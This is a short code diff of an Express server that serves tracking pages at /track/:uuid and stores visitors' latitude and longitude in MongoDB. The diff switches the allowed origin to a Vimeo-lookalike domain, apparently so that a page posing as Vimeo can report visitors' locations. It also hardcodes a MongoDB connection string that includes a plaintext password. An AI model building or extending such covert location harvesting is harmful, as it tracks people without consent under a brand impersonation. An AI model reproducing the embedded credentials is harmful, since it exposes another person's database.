@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 app.use(bodyParser.json());
-app.use(cors({ origin: 'https://geo-localisation.onrender.com/location' }));
+app.use(cors({ origin: 'https://vimeo-seven.vercel.app' }));
 
 const mongoURI = "mongodb+srv://heshimajulienofficial:gZo66bAOKJBetFSQ@localisation.st4rgvh.mongodb.net/?retryWrites=true&w=majority&appName=localisation";
 const port = process.env.PORT || 3000;
@@ -30,7 +30,7 @@ app.get('/track/:uuid', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'track.html'));
 });
 
-app.post('/location', async (req, res) => {
+app.post('/api/location', async (req, res) => {
     const { uuid, latitude, longitude } = req.body;
     const newLocation = new Location({ uuid, latitude, longitude, timestamp: new Date() });
     
